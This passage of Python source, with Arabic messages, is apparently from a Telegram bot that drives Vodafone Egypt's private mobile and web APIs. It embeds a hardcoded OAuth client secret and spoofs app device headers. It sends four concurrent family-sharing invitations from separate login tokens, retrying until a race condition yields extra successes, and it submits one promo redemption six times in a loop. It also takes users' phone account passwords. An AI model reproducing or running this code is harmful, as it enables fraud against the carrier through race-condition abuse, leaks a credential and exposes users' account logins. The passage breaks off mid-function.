            return "❌ فشل تسجيل الدخول. تحقق من البيانات وحاول مرة أخرى."
        
        offers_data = get_flex_discount_offers(login_data)
        if not offers_data:
            return "❌ لا توجد عروض خصم متاحة حالياً."
        
        offers_list = extract_all_discount_offers(offers_data)
        if not offers_list or offer_index >= len(offers_list):
            return "❌ العرض غير موجود."
        
        selected_offer = offers_list[offer_index]
        
        success = purchase_discount_offer(login_data, selected_offer)
        
        if success:
            return f"✅ تم تثبيت خصم {selected_offer.get('clean_desc', '')} بنجاح!"
        else:
            return "❌ فشل تثبيت الخصم. حاول مرة أخرى."
            
    except Exception as e:
        return f"❌ خطأ في تطبيق الخصم: {str(e)}"

# ===== خدمة إضافة فرد للعائلة 4×4 (الجديدة) =====
FAMILY_API_URL = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
ACCEPT_INVITATION_URL = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
REMOVE_MEMBER_URL = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"

async def authenticate_multiple_tokens_async(session, username, password, num_tokens=4):
    """
    يقوم بتنفيذ عمليات مصادقة متعددة متزامنة للحصول على عدة توكنات.
    """
    async def authenticate_single():
        loop = asyncio.get_event_loop()
        success, token, _, _ = await loop.run_in_executor(None, login, username, password)
        return token if success else None
    
    tasks = [authenticate_single() for _ in range(num_tokens)]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    valid_tokens = [token for token in results if token and isinstance(token, str)]
    
    while len(valid_tokens) < num_tokens:
        needed = num_tokens - len(valid_tokens)
        additional_tasks = [authenticate_single() for _ in range(needed * 2)]
        additional_results = await asyncio.gather(*additional_tasks, return_exceptions=True)
        new_tokens = [token for token in additional_results if token and isinstance(token, str)]
        valid_tokens.extend(new_tokens[:needed])
        if new_tokens:
            await asyncio.sleep(1)
    
    return valid_tokens[:num_tokens]

async def add_family_member_async(session, access_token, owner_number, member_number, quota_value, thread_id, attempt_num):
    """
    يرسل طلب لإضافة عضو جديد إلى فليكس فاميلي بحصة محددة مع معرف فريد للثريد.
    """
    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]

    payload = json.dumps({
      "name": "FlexFamily", "type": "SendInvitation", "category": [
        {"value": "523", "listHierarchyId": "PackageID"}, {"value": "47", "listHierarchyId": "TemplateID"},
        {"value": "523", "listHierarchyId": "TierID"}, {"value": "percentage", "listHierarchyId": "familybehavior"}
      ], "parts": { "member": [
          {"id": [{"value": owner_number, "schemeName": "MSISDN"}], "type": "Owner"},
          {"id": [{"value": member_number, "schemeName": "MSISDN"}], "type": "Member"}
        ], "characteristicsValue": {
          "characteristicsValue": [{"characteristicName": "quotaDist1", "value": str(quota_value), "type": "percentage"}]
        }
      }
    })
    
    headers = {
      'User-Agent': random.choice(USER_AGENTS_APPLE), 
      'Accept': "application/json", 
      'Content-Type': "application/json",
      'Authorization': f"Bearer {access_token}", 
      'msisdn': owner_number, 
      'clientId': "WebsiteConsumer",
      'Origin': "https://web.vodafone.com.eg", 
      'Referer': "https://web.vodafone.com.eg/spa/familySharing",
      'X-Request-ID': f"{thread_id}-{attempt_num}-{random.randint(1000, 9999)}"
    }

    try:
        async with session.post(FAMILY_API_URL, data=payload, headers=headers, timeout=45) as response:
            timestamp_end = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            if response.status in [200, 201, 204]:
                return True, response.status, "تم بنجاح", thread_id
            else:
                try:
                    error_details = await response.json()
                    error_message = json.dumps(error_details, indent=2, ensure_ascii=False)[:200]
                except:
                    error_message = await response.text()[:200]
                
                return False, response.status, error_message, thread_id
                
    except Exception as e:
        return False, 0, str(e), thread_id

async def send_4_concurrent_invitations(session, tokens_list, owner_number, member_number, quota_value, attempt_num):
    """
    يرسل 4 دعوات متزامنة كل واحدة بتوكن مختلف.
    """
    tasks = []
    for i in range(4):
        if i < len(tokens_list):
            task = add_family_member_async(
                session, 
                tokens_list[i], 
                owner_number, 
                member_number, 
                quota_value, 
                i + 1,
                attempt_num
            )
            tasks.append(task)
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    successful_invitations = []
    failed_invitations = []
    
    for i, result in enumerate(results):
        if isinstance(result, Exception):
            failed_invitations.append((i+1, 0, str(result)))
        else:
            success, status_code, message, thread_id = result
            if success:
                successful_invitations.append((thread_id, status_code))
            else:
                failed_invitations.append((thread_id, status_code, message))
    
    return successful_invitations, failed_invitations

async def remove_family_member_with_retry_async(session, access_token, owner_number, member_number, max_retries=float('inf')):
    """
    يقوم بإرسال طلب حذف العضو من المجموعة مع إعادة المحاولة كل 10 ثوانٍ حتى النجاح.
    """
    attempt = 1
    while True:
        payload = {
            "name": "FlexFamily",
            "type": "FamilyRemoveMember",
            "category": [
                {"value": "47", "listHierarchyId": "TemplateID"}
            ],
            "parts": {
                "member": [
                    {"id": [{"value": owner_number, "schemeName": "MSISDN"}], "type": "Owner"},
                    {"id": [{"value": member_number, "schemeName": "MSISDN"}], "type": "Member"}
                ],
                "characteristicsValue": {
                    "characteristicsValue": [
                        {"characteristicName": "Disconnect", "value": "0"},
                        {"characteristicName": "LastMemberDeletion", "value": "1"}
                    ]
                }
            }
        }
        
        headers = {
            'Authorization': f"Bearer {access_token}",
            'Content-Type': "application/json",
            'msisdn': owner_number,
            'User-Agent': random.choice(USER_AGENTS_APPLE),
            'Accept': "application/json",
            'clientId': "WebsiteConsumer"
        }

        try:
            async with session.patch(REMOVE_MEMBER_URL, data=json.dumps(payload), headers=headers, timeout=30) as response:
                if response.status in [200, 201, 204]:
                    return True, attempt
                elif response.status == 404:
                    return True, attempt
                else:
                    pass
                    
        except Exception as e:
            pass
        
        await asyncio.sleep(10)
        attempt += 1

async def cleanup_pending_invitations_with_retry(session, tokens_list, owner_number, member_number, successful_threads):
    """
    يحذف جميع الدعوات المعلقة مع إعادة المحاولة حتى النجاح لكل واحدة.
    """
    cleanup_results = []
    
    for thread_id, _ in successful_threads:
        success, attempts = await remove_family_member_with_retry_async(
            session, 
            tokens_list[0], 
            owner_number, 
            member_number
        )
        
        if success:
            cleanup_results.append((thread_id, True, attempts))
        else:
            cleanup_results.append((thread_id, False, attempts))
        
        await asyncio.sleep(2)
    
    return cleanup_results

async def accept_invitation_async(session, owner_number, member_number, member_password, attempt_num):
    """
    يقوم بإرسال طلب قبول الدعوة للعضو المحدد.
    """
    async with aiohttp.ClientSession() as auth_session:
        access_token = await authenticate_multiple_tokens_async(auth_session, member_number, member_password, 1)
        if not access_token or not access_token[0]:
            return False
        
        token = access_token[0]

    headers = {
        "Authorization": f"Bearer {token}",
        "msisdn": member_number,
        "Accept": "application/json",
        "Accept-Language": "ar",
        "Content-Type": "application/json; charset=UTF-8",
        "User-Agent": USER_AGENT_MOBILE,
        "clientId": "AnaVodafoneAndroid",
        "api-version": "v2",
        "useCase": "MIProfile",
    }

    data = {
        "category": [{"listHierarchyId": "TemplateID", "value": "47"}],
        "name": "FlexFamily",
        "parts": {
            "member": [
                {"id": [{"schemeName": "MSISDN", "value": owner_number}], "type": "Owner"},
                {"id": [{"schemeName": "MSISDN", "value": member_number}], "type": "Member"}
            ]
        },
        "type": "AcceptInvitation"
    }

    try:
        async with session.patch(ACCEPT_INVITATION_URL, headers=headers, json=data, timeout=30) as response:
            if response.status in [200, 201]:
                return True
            else:
                return False
    except Exception as e:
        return False

async def add_member_with_4_parallel_tokens(owner_number, owner_password, member_number, member_password, quota_value, quota_display, user_id, bot_instance):
    """إضافة عضو واحد مع إرسال 4 دعوات متزامنة باستخدام 4 توكنات مختلفة"""
    result_message = ""
    
    connector = aiohttp.TCPConnector(limit=20, limit_per_host=10, force_close=True)
    timeout = aiohttp.ClientTimeout(total=60)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        attempt = 1
        total_successful_invitations = 0
        owner_token_used = None
        
        while total_successful_invitations < 2:
            owner_tokens = await authenticate_multiple_tokens_async(session, owner_number, owner_password, 4)
            
            if len(owner_tokens) < 4:
                await asyncio.sleep(10)
                attempt += 1
                continue
            
            if not owner_token_used:
                owner_token_used = owner_tokens[0]
            
            successful, failed = await send_4_concurrent_invitations(
                session, owner_tokens, owner_number, member_number, quota_value, attempt
            )
            
            new_successes = len(successful)
            total_successful_invitations += new_successes
            
            if total_successful_invitations >= 2:
                result_message += f"✅ تم تحقيق الهدف! لدينا {total_successful_invitations} دعوات ناجحة\n"
                break
            else:
                if successful:
                    result_message += f"⚠️ لدينا {len(successful)} دعوة ناجحة لكننا نحتاج 2. جاري التنظيف...\n"
                    
                    cleanup_results = await cleanup_pending_invitations_with_retry(
                        session, owner_tokens, owner_number, member_number, successful
                    )
                    
                    all_cleaned = all(result[1] for result in cleanup_results)
                    if all_cleaned:
                        result_message += f"✅ تم تنظيف جميع الدعوات المعلقة بنجاح!\n"
                        total_successful_invitations = 0
                    else:
                        result_message += f"❌ فشل تنظيف بعض الدعوات. سيتم إعادة المحاولة في الجولة القادمة...\n"
                
                await asyncio.sleep(10)
                attempt += 1
        
        result_message += f"⏳ انتظار 8 ثوانٍ قبل البدء في قبول الدعوة...\n"
        await asyncio.sleep(8)
        
        accept_attempt = 1
        accept_success = False
        while accept_attempt <= 3:
            if await accept_invitation_async(session, owner_number, member_number, member_password, accept_attempt):
                result_message += f"✅ تم قبول الدعوة للعضو {member_number} بنجاح!\n"
                accept_success = True
                break
            
            if accept_attempt < 3:
                await asyncio.sleep(6)
            accept_attempt += 1
        
        if not accept_success:
            result_message += f"❌ فشل قبول الدعوة للعضو {member_number} بعد {accept_attempt-1} محاولات\n"
        
        return result_message

def run_add_family_member_4x4(user_id, bot_instance, owner_number, owner_password, member_number, member_password, quota_value, quota_display):
    """تشغيل عملية إضافة فرد للعائلة 4×4 في ثريد منفصل"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(
            add_member_with_4_parallel_tokens(
                owner_number, owner_password, 
                member_number, member_password, 
                quota_value, quota_display, 
                user_id, bot_instance
            )
        )
        return result
    finally:
        loop.close()

# ===== دوال شراء الهدايا الجديدة (من سكربت فصل عرضك) =====
def get_available_gifts_types(token, msisdn, param1="260.72", param2=523):
    """الحصول على أنواع الهدايا المتاحة"""
    url = "https://mobile.vodafone.com.eg/mobile-app-upgrade/promo/unifiedEligiblityPromo?lang=ar"
    
    payload = {
        "promoId": 2633,
        "channelId": "1",
        "inquiryCustomerInfo": "0",
        "inquireEligibleGifts": "1",
        "inquireCurrentGifts": "0",
        "inquireHistoryGifts": "0",
        "param1": param1,
        "param2": param2
    }
    
    headers = {
        'User-Agent': "okhttp/4.11.0",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Realme RMX3871",
        'x-agent-version': "2024.12.1",
        'x-agent-build': "946",
        'msisdn': msisdn,
        'buildNumber': "946",
        'operatingSystem': "U.R4T2.1fcb3e1-2_30269",
        'platform': "Android",
        'deviceType': "RE6063L1",
        'Content-Type': "application/json; charset=UTF-8"
    }
    
    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=30)
        
        if response.status_code == 200:
            response_data = response.json()
            
            if response_data.get('eCode') == 0 and 'gifts' in response_data:
                gifts = response_data['gifts']
                
                unique_gifts = {}
                for gift in gifts:
                    gift_type = gift.get('giftType', '')
                    gift_name_ar = gift.get('giftNameAr', '')
                    
                    if gift_type and gift_type not in unique_gifts:
                        unique_gifts[gift_type] = {
                            'giftNameAr': gift_name_ar,
                            'giftType': gift_type,
                            'giftNameEn': gift.get('giftNameEn', '')
                        }
                
                return unique_gifts
            else:
                return None
        else:
            return None
            
    except Exception as e:
        logger.error(f"خطأ في get_available_gifts_types: {e}")
        return None

def get_gift_details(token, msisdn, param1, param2, gift_type):
    """الحصول على تفاصيل هدية محددة"""
    url = "https://mobile.vodafone.com.eg/mobile-app-upgrade/promo/unifiedEligiblityPromo?lang=ar"
    
    payload = {
        "promoId": 2633,
        "channelId": "1",
        "inquiryCustomerInfo": "0",
        "inquireEligibleGifts": "0",
        "inquireCurrentGifts": "1",
        "inquireHistoryGifts": "0",
        "param1": param1,
        "param2": param2,
        "param3": gift_type
    }
    
    headers = {
        'User-Agent': "okhttp/4.11.0",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Realme RMX3871",
        'x-agent-version': "2024.12.1",
        'x-agent-build': "946",
        'msisdn': msisdn,
        'buildNumber': "946",
        'operatingSystem': "U.R4T2.1fcb3e1-2_30269",
        'platform': "Android",
        'deviceType': "RE6063L1",
        'Content-Type': "application/json; charset=UTF-8"
    }
    
    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=30)
        
        if response.status_code == 200:
            response_data = response.json()
            
            if response_data.get('eCode') == 0 and 'gifts' in response_data:
                gifts = response_data['gifts']
                
                gift_details = []
                for gift in gifts:
                    gift_details.append({
                        'giftNameAr': gift.get('giftNameAr', f'هدية نوع {gift_type}'),
                        'giftFees': gift.get('giftFees', '0'),
                        'giftQuota': gift.get('giftQuota', ''),
                        'giftMinutes': gift.get('giftMinutes', ''),
                        'giftMegabytes': gift.get('giftMegabytes', ''),
                        'giftValidity': gift.get('giftValidity', ''),
                        'giftType': gift.get('giftType', gift_type),
                        'giftValidityId': gift.get('giftValidityId', ''),
                        'isSallefny': gift.get('isSallefny', '0')
                    })
                
                return gift_details
            else:
                return None
        else:
            return None
            
    except Exception as e:
        logger.error(f"خطأ في get_gift_details: {e}")
        return None

def purchase_gift(token, msisdn, param1, param2, gift_type, gift_info):
    """شراء هدية محددة"""
    url = "https://mobile.vodafone.com.eg/mobile-app-upgrade/promo/unifiedEligiblityPromo?lang=ar"
    
    payload = {
        "promoId": 2633,
        "channelId": "1",
        "inquiryCustomerInfo": "0",
        "inquireCurrentGifts": "1",
        "inquireHistoryGifts": "0",
        "param1": param1,
        "param2": param2,
        "param3": gift_type
    }
    
    headers = {
        'User-Agent': "okhttp/4.11.0",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "Realme RMX3871",
        'x-agent-version': "2024.12.1",
        'x-agent-build': "946",
        'msisdn': msisdn,
        'buildNumber': "946",
        'operatingSystem': "U.R4T2.1fcb3e1-2_30269",
        'platform': "Android",
        'deviceType': "RE6063L1",
        'Content-Type': "application/json; charset=UTF-8"
    }
    
    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=30)
        
        if response.status_code == 200:
            response_data = response.json()
            if response_data.get('eCode') == 0:
                return True, response_data
            else:
                return False, response_data.get('eDesc', 'فشل الشراء')
        else:
            return False, f"خطأ في الاستجابة: {response.status_code}"
            
    except Exception as e:
        return False, str(e)

def parse_voice_and_mi_details(gift_name, gift_quota, gift_minutes):
    """تحليل اسم الهدية النوع 3 لاستخراج الدقائق والميجابيتس"""
    minutes = ""
    megabytes = ""
    
    if gift_minutes:
        minutes = f"{gift_minutes} دقيقة"
    elif gift_quota and gift_quota.isdigit():
        minutes = f"{gift_quota} دقيقة"
    
    if "دقيقة" in gift_name and "ميجابيتس" in gift_name:
        import re
        numbers = re.findall(r'\d+', gift_name)
        if len(numbers) >= 2:
            minutes = f"{numbers[0]} دقيقة"
            megabytes = f"{numbers[1]} ميجابايت"
        elif len(numbers) == 1:
            minutes = f"{numbers[0]} دقيقة"
    
    return minutes, megabytes

# ===== دوال التأكيد والإلغاء الجديدة =====
def create_confirmation_keyboard(action_type, data):
    """إنشاء لوحة تأكيد/إلغاء مع حمل البيانات اللازمة"""
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("✅ تأكيد", callback_data=f"confirm_{action_type}"),
        InlineKeyboardButton("❌ إلغاء", callback_data="cancel_action")
    )
    return keyboard

# ===== دوال شراء الهدايا المعدلة (لا تطلب رقم/باسورد) =====
def redeem_vodafone_gifts_6(number: str, password: str) -> str:
    """تفعيل 6 هدايا/عروض فودافون - تستخدم get_fresh_token"""
    try:
        token = get_fresh_token(number, password)
        if not token or token.startswith("ERROR:"):
            return "❌ فشل تسجيل الدخول! تأكد من الرقم وكلمة المرور."

        headers = {
            'User-Agent': "okhttp/4.11.0",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip",
            'silentLogin': "false",
            'x-agent-operatingsystem': "13",
            'clientId': "ana-vodafone-app",
            'Accept-Language': "ar",
            'x-agent-device': "Xiaomi 21061119AG",
            'x-agent-version': "2025.11.1",
            'x-agent-build': "946",
            'digitalId': "28RI9U7IINOOB",
            'Authorization': f"Bearer {token}",
            'Content-Type': "application/json; charset=UTF-8",
            'channel': "MOBILE",
            'useCase': "Promo",
            'api-version': 'v2',
            'msisdn': number,
        }

        promo_data = {
            "promoId": "2633",
            "channelId": "1",
            "wlistId": "2553",
            "contextualPromoId": "13",
            "triggerId": "189",
            "param3": "0.5",
            "param4": "1",
            "param6": "0",
            "param1": "5",
            "param2": "50",
        }

        success_count = 0
        responses = []
        
        for i in range(6):
            try:
                rr = requests.post(
                    "https://mobile.vodafone.com.eg/mobile-app/promo/unifiedRedeemPromo?lang=ar",
                    headers=headers,
                    json=promo_data,
                    timeout=25,
                )
                
                logger.info(f"🎁 محاولة {i+1}: {rr.status_code}")
                
                if rr.status_code == 200:
                    success_count += 1
                    responses.append("✅ ناجحة")
                else:
                    responses.append(f"❌ {rr.status_code}")
                    
            except Exception as e:
                responses.append(f"⚠️ {str(e)}")
                logger.error(f"خطأ في المحاولة {i+1}: {e}")

        logger.info(f"🎁 النتائج: {responses}")
        
        if success_count > 0:
            return f"✅ تم تفعيل {success_count} من هدايا فودافون بنجاح! 🎉\n\n📊 تفاصيل:\n" + "\n".join(responses)
        return "❌ فشل في تفعيل هدايا فودافون"

    except Exception as e:
        logger.error(f"❌ خطأ في redeem_vodafone_gifts_6: {e}", exc_info=True)
        return f"❌ حدث خطأ: {str(e)}"


def redeem_vodafone_plus_discount(number: str, password: str) -> str:
    """خصم بلس (scratchCoupon) - تم استبداله بدالة 500 وحدة متجددة"""
    # تم استبدال هذه الدالة بالدالة الجديدة send_500_units_gift
    # سنتركها للتوافق ولكن سيتم استدعاء الدالة الجديدة من الزر
    return send_500_units_gift(number, password, number)  # مؤقتاً

# ===== دالة جديدة لـ 500 وحدة متجددة (بدلاً من خصم بلس) =====
def send_500_units_gift(owner_number: str, owner_password: str, target_number: str) -> str:
    """
    إرسال هدية 500 وحدة متجددة لرقم آخر باستخدام برومو nearbyRamadan26
    تُرجع رسالة منسقة تحتوي على تفاصيل النجاح أو الفشل.
    """
    try:
        # 1. تسجيل الدخول للحصول على التوكن
        url1 = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
        payload1 = {
            'grant_type': "password",
            'username': owner_number,
            'password': owner_password,
            'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
            'client_id': "ana-vodafone-app"
        }
        headers1 = {
            'User-Agent': "okhttp/4.12.0",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip",
            'silentLogin': "true",
            'x-agent-operatingsystem': "13",
            'clientId': "AnaVodafoneAndroid",
            'Accept-Language': "ar",
            'x-agent-device': "Xiaomi 21061119AG",
            'x-agent-version': "2025.10.3",
            'x-agent-build': "1050",
            'digitalId': "28RI9U7ISU8SW",
            'device-id': "1df4efae59648ac3"
        }

        response1 = requests.post(url1, data=payload1, headers=headers1, timeout=30)
        if response1.status_code != 200:
            return f"❌ فشل إرسال الهدية\n\n❌ لا توجد هدايا 500 ميجا متاحة حالياً\n\n📱 المرسل: {owner_number}\n📱 المستلم: {target_number}\n\n💡 الأسباب المحتملة:\n• الهدية غير متاحة لخطك حالياً\n• لا يوجد رصيد كافي (إذا كانت مدفوعة)\n• تم إرسال الهدية مسبقاً"

        access_token = response1.json()['access_token']

        # 2. جلب تفاصيل الهدية المتاحة
        url2 = "https://web.vodafone.com.eg/services/dxl/promo/promotion"
        params2 = {
            '@type': "Promo",
            '$.context.type': "nearbyRamadan26"
        }
        headers2 = {
            'User-Agent': "vodafoneandroid",
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-platform': "\"Android\"",
            'Authorization': f"Bearer {access_token}",
            'Accept-Language': "AR",
            'msisdn': owner_number,
            'clientId': "WebsiteConsumer",
            'sec-ch-ua': "\"Not:A-Brand\";v=\"99\", \"Android WebView\";v=\"145\", \"Chromium\";v=\"145\"",
            'sec-ch-ua-mobile': "?1",
            'channel': "APP_PORTAL",
            'Content-Type': "application/json",
            'X-Requested-With': "com.emeint.android.myservices",
            'Sec-Fetch-Site': "same-origin",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://web.vodafone.com.eg/portal/bf/massNearByPromo26",
        }

        response2 = requests.get(url2, params=params2, headers=headers2, timeout=30)
        if response2.status_code != 200:
            return f"❌ فشل إرسال الهدية\n\n❌ لا توجد هدايا 500 ميجا متاحة حالياً\n\n📱 المرسل: {owner_number}\n📱 المستلم: {target_number}\n\n💡 الأسباب المحتملة:\n• الهدية غير متاحة لخطك حالياً\n• لا يوجد رصيد كافي (إذا كانت مدفوعة)\n• تم إرسال الهدية مسبقاً"

        try:
            data2 = response2.json()
            # نفترض أن الهدية هي العنصر الثاني (كما في المثال)
            promo_item = data2[1] if len(data2) > 1 else data2[0]
            amount = ""
            validity = ""
            for ch in promo_item.get("characteristics", []):
                if ch["name"] == "amount":
                    amount = ch["value"]
                if ch["name"] == "OfferValidity":
                    validity = ch["value"]
            promo_id = promo_item["id"]
            channel_id = promo_item.get("channel", {}).get("id")
        except Exception as e:
            return f"❌ فشل إرسال الهدية\n\n❌ لا توجد هدايا 500 ميجا متاحة حالياً\n\n📱 المرسل: {owner_number}\n📱 المستلم: {target_number}\n\n💡 الأسباب المحتملة:\n• الهدية غير متاحة لخطك حالياً\n• لا يوجد رصيد كافي (إذا كانت مدفوعة)\n• تم إرسال الهدية مسبقاً"

        # 3. إرسال الهدية للرقم المستهدف
        url3 = "https://web.vodafone.com.eg/services/dxl/promo/promotion"
        payload3 = {
            "@type": "Promo",
            "channel": {"id": channel_id},
            "context": {"type": "nearbyRamadan26"},
            "pattern": [{
                "id": promo_id,
                "characteristics": [
                    {"name": "redemptionFlag", "value": "0"},
                    {"name": "BMsisdn", "value": target_number}
                ]
            }]
        }
        headers3 = {
            'User-Agent': "vodafoneandroid",
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-platform': "\"Android\"",
            'Authorization': f"Bearer {access_token}",
            'Accept-Language': "AR",
            'msisdn': owner_number,
            'clientId': "WebsiteConsumer",
            'sec-ch-ua': "\"Not:A-Brand\";v=\"99\", \"Android WebView\";v=\"145\", \"Chromium\";v=\"145\"",
            'sec-ch-ua-mobile': "?1",
            'channel': "APP_PORTAL",
            'Content-Type': "application/json",
            'X-Requested-With': "com.emeint.android.myservices",
            'Sec-Fetch-Site': "same-origin",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://web.vodafone.com.eg/portal/bf/massNearByPromo26",
        }

        response3 = requests.post(url3, data=json.dumps(payload3), headers=headers3, timeout=30)

        if response3.status_code == 200:
            return f"✅ تم إرسال الهدية بنجاح!\n\n✅ تم إرسال 500 Units هدية إلى الرقم {target_number} بنجاح!\n\n📱 المرسل: {owner_number}\n📱 المستلم: {target_number}\n🎁 الهدية: 500 Units\n📅 صلاحية الهدية: {validity}"
        else:
            return f"❌ فشل إرسال الهدية\n\n❌ لا توجد هدايا 500 ميجا متاحة حالياً\n\n📱 المرسل: {owner_number}\n📱 المستلم: {target_number}\n\n💡 الأسباب المحتملة:\n• الهدية غير متاحة لخطك حالياً\n• لا يوجد رصيد كافي (إذا كانت مدفوعة)\n• تم إرسال الهدية مسبقاً"

    except Exception as e:
        return f"❌ فشل إرسال الهدية\n\n❌ لا توجد هدايا 500 ميجا متاحة حالياً\n\n📱 المرسل: {owner_number}\n📱 المستلم: {target_number}\n\n💡 الأسباب المحتملة:\n• الهدية غير متاحة لخطك حالياً\n• لا يوجد رصيد كافي (إذا كانت مدفوعة)\n• تم إرسال الهدية مسبقاً"

# ===== دوال جديدة لباقات الإنترنت (المضافة) =====
def create_internet_bundles_keyboard():
    """إنشاء لوحة مفاتيح لباقات الإنترنت"""
    markup = types.InlineKeyboardMarkup(row_width=2)
    for key, bundle in BUNDLES.items():
        markup.add(types.InlineKeyboardButton(bundle['name'], callback_data=f"ib_select_{key}"))
    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="services_section"))
    return markup

# ===== دالة الحصول على تقرير كامل عن الباقة والفليكسات =====
def get_complete_package_report(number, password):
    """
    دالة لجلب جميع بيانات الباقة والفليكسات
    تُرجع tuple: (رسالة منسقة, قاموس بالبيانات)
    """
    try:
        token = get_fresh_token(number, password)
        if token.startswith("ERROR:"):
            return "❌ فشل تسجيل الدخول", {}
        
        # الحصول على بيانات AllInOne و FlexProfile
        all_data = get_all_in_one_data(number, token)
        flex_data = get_flex_profile_data(number, token)
        
        # استخراج معلومات الباقة باستخدام الدالة المحدثة
        bundle_info = extract_bundle_info(all_data, flex_data)
        
        # الحصول على بيانات الفليكسات من تقرير الاستهلاك
        flex_remaining = get_flex_remaining_new(number, token)
        renewal_date, days_left = get_flex_renewal_info(number, token)
        
        # تجميع البيانات
        package_info = {
            "package_name": bundle_info.get("package_name", "غير معروف"),
            "package_price": bundle_info.get("package_price", 0),
            "flex_current": str(flex_remaining) if flex_remaining is not None else "غير متوفر",
            "flex_renewal_date": renewal_date if renewal_date else "غير محدد",
            "flex_days_left": days_left if days_left is not None else "غير محدد",
            "money_back": "0"  # يمكن إضافته لاحقاً
        }
        
        # رسالة منسقة
        message = f"""
📱 معلومات حسابك:

• الباقة الحالية: {package_info['package_name']}
• سعر الباقة: {package_info['package_price']} جنيه
• الفليكسات المتبقية: {package_info['flex_current']} فليكس
• تاريخ تجديد باقة فليكس: {package_info['flex_renewal_date']}
• الأيام المتبقية حتى التجديد: {package_info['flex_days_left']} يوم
        """
        
        return message, package_info
        
    except Exception as e:
        logger.error(f"خطأ في get_complete_package_report: {e}")
        return f"❌ خطأ في جلب معلومات الباقة: {str(e)}", {}

# ===== دالة جديدة لتحويل الفليكسات (مضافة) =====
def execute_flex_transfer(sender_number, token, receiver_number, amount):
    """تحويل فليكسات من حساب إلى آخر"""
    url = "https://mobile.vodafone.com.eg/services/dxl/pbm/prepayBalanceManagement/v4/transferBalance"
    payload = {
        "amount": {"amount": str(amount)}, 
        "bucket": {"id": sender_number}, 
        "receiver": {"id": receiver_number}, 
        "@type": "flexTransfer"
    }
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive", 
        'Accept': "application/json", 
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'Authorization': f"Bearer {token}", 
        'api-version': "v2", 
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid", 
        'x-agent-device': "Samsung SM-A165F", 
        'x-agent-version': "2025.12.2",
        'x-agent-build': "1080", 
        'msisdn': sender_number, 
        'Accept-Language': "ar"
    }
    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=20)
        if response.status_code in [200, 201]:
            return True, f"✅ تم تحويل <b>{amount}</b> فليكس إلى الرقم <code>{receiver_number}</code> بنجاح!"
        else:
            try:
                error_desc = response.json().get('description', 'سبب غير معروف.')
                # تحسين رسالة الخطأ إذا كان السبب غير معروف
                return False, f"❌ تحقق من وجود رصيد و فليكسات كافيه و اعد المحاوله"
            except:
                return False, f"❌ تحقق من وجود رصيد و فليكسات كافيه و اعد المحاوله"
    except Exception as e:
        logger.error(f"Transfer Error: {e}")
        return False, "❌ تحقق من وجود رصيد و فليكسات كافيه و اعد المحاوله"

# ===== دوال جديدة لخدمة شحن الكروت (من السكربت الجديد) =====
def recharge_card_with_token(user_id, token, msisdn, target_number, card_number):
    """شحن كارت رصيد باستخدام التوكن - مأخوذ من سكربت شحن 2026"""
    url = "https://web.vodafone.com.eg/services/dxl/paymentmng/payment"
    
    payload = {
        "payer": {
            "id": target_number
        },
        "paymentItem": [
            {
                "item": {
                    "@referredType": "RechargeScratchCard"
                }
            }
        ],
        "paymentMethod": {
            "id": card_number,
            "@type": "Voucher"
        },
        "channel": {
            "characteristics": [
                {
                    "name": "digitalTransactionId",
                    "value": str(uuid.uuid4()).replace('-', '')[:20]  # توليد معرف عشوائي
                }
            ]
        }
    }

    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        'Accept': "application/json",
        'Content-Type': "application/json",
        'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
        'api_id': "WEB",
        'msisdn': msisdn,  # الرقم المسجل (المرسل)
        'Accept-Language': "AR",
        'useCase': "creditCardHistory",
        'sec-ch-ua-mobile': "?1",
        'Authorization': f"Bearer {token}",
        'clientId': "WebsiteConsumer",
        'sec-ch-ua-platform': "\"Android\"",
        'Origin': "https://web.vodafone.com.eg",
        'Sec-Fetch-Site': "same-origin",
